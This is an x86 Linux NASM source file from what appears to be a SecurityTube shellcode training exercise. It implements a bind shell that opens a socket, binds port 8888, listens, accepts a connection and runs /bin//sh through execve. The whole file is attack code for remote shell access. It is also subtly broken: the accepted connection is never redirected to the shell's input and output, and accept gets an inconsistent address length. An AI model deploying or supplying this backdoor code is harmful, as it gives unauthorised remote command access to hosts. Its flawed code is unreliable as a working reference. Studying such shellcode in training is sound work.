; Filename: .nasm
; Author:  Vivek Ramachandran
; Website:  http://securitytube.net
; Training: http://securitytube-training.com 
;
;
; Purpose: 

%assign SOCK_STREAM         1
%assign AF_INET             2
%assign SYS_socketcall      102
%assign SYS_SOCKET          1

global _start			



section .text
_start:


	; Message 1
	mov eax, 0x4
	mov ebx, 1
	mov ecx, message
	mov edx, mlen
	int 0x80

	; Socket - 359
	; int socket (
    ;  int domain = 2;
    ;  int type = 1;
    ;  int protocol = 0;
	; ) =  14;
	mov eax, 0x167
	mov ebx, 2
	mov ecx, 1
	mov edx, 0
	int 0x80
	mov dword [socket], eax


	; Message 2
	mov eax, 0x4
	mov ebx, 1
	mov ecx, message2
	mov edx, mlen2
	int 0x80

	; Bind - 361
	mov eax, 0x169
	mov ebx, [socket]
	push    dword   0x00000000 
    push    dword   0xb822; big endian
    push    word    2 
    mov [socket_address], esp
	mov ecx, [socket_address]
	mov edx, 0x10 ; 16 
	int 0x80


	; Message 3
	mov eax, 0x4
	mov ebx, 1
	mov ecx, message3
	mov edx, mlen3
	int 0x80

	; Listen - 363
	; int listen (
    ;  int s = 14;
    ;  int backlog = 0;
	; ) =  0;
	mov eax, 0x16b
	mov ebx, [socket]
	mov ecx, 0
	int 0x80


	; Message 4
	mov eax, 0x4
	mov ebx, 1
	mov ecx, message4
	mov edx, mlen4
	int 0x80

	; Accept - 364
	; int accept (
    ; 	int sockfd = 14;
    ; 	sockaddr_in * addr = 0x00000000 => 
    ;     none;
    ; 	int addrlen = 0x00000010 => 
    ;     none;
	; ) =  19;
	mov eax, 0x16c
	mov ebx, [socket]
	mov ecx, 0
	mov edx, 0x10 ; 16 
	int 0x80


	; Execve
	xor eax, eax
	push eax
	push 0x68732f2f
	push 0x6e69622f
	mov ebx, esp
	push eax
	mov edx, esp
	push ebx
	mov ecx, esp
	mov al, 11
	int 0x80


	; Exit
	mov eax, 1
	mov ebx, 10		; sys_exit syscall
	int 0x80



section .data
	message: db "Socket",0xA
	mlen     equ $-message
	message2: db "Bind",0xA
	mlen2     equ $-message2
	message3: db "Listen",0xA
	mlen3     equ $-message3
	message4: db "Accept",0xA
	mlen4     equ $-message4



section .bss
	socket resd 1
	socket_address resd 2
	accept_res	resd 1
	cArray	resd 1
			resd 1
			resd 1
			resd 1
 